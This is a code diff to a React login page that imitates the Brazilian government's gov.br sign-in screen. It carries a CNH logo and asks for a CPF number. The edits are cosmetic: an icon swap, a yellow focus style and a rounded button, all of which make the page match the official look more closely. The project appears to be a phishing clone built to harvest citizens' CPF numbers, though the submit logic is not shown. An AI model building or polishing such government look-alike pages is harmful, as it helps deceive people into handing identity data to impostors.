@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { Shield, Banknote, Moon, Accessibility } from 'lucide-react';
+import { Banknote, Moon, Accessibility, UserSquare } from 'lucide-react';
 
 const LoginHeader: React.FC = () => (
   <header className="bg-white border-b border-gray-200">
@@ -91,12 +91,16 @@ const LoginPage: React.FC = () => {
       <main className="max-w-sm mx-auto px-4 py-8">
         <CnhLogo />
         <div className="bg-white p-6 rounded-lg shadow">
-          <h1 className="text-lg font-semibold text-gray-800 mb-1">Identifique-se no gov.br com:</h1>
-          <div className="flex items-center gap-2 mb-6">
-            <Shield size={18} className="text-blue-600" />
-            <p className="text-sm text-gray-600">
-              Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
-            </p>
+          <h1 className="text-xl font-bold text-gray-800 mb-4">Identifique-se no gov.br com:</h1>
+          
+          <div className="flex items-start gap-3 mb-6">
+            <UserSquare size={24} className="text-blue-600 mt-1 shrink-0" />
+            <div>
+              <p className="font-semibold text-gray-700">Número do CPF</p>
+              <p className="text-sm text-gray-600">
+                Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
+              </p>
+            </div>
           </div>
           
           <form onSubmit={handleSubmit}>
@@ -108,14 +112,14 @@ const LoginPage: React.FC = () => {
                 placeholder="000.000.000-00"
                 value={cpf}
                 onChange={handleCpfChange}
-                className="w-full p-3 border border-gray-400 rounded focus:ring-2 focus:ring-blue-500 focus:outline-none"
+                className="w-full p-3 border border-gray-400 rounded-lg focus:bg-yellow-100 focus:border-yellow-500 focus:ring-1 focus:ring-yellow-500 focus:outline-none text-lg tracking-wider"
                 disabled={isLoading}
                 maxLength={14}
               />
             </div>
             <button 
               type="submit"
-              className="w-full bg-[#0d6efd] text-white py-3 rounded-lg font-bold text-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400"
+              className="w-full bg-[#0d6efd] text-white py-3 rounded-full font-bold text-lg hover:bg-blue-700 transition-colors disabled:bg-gray-400"
               disabled={isLoading}
             >
               {isLoading ? 'Verificando...' : 'Continuar'}
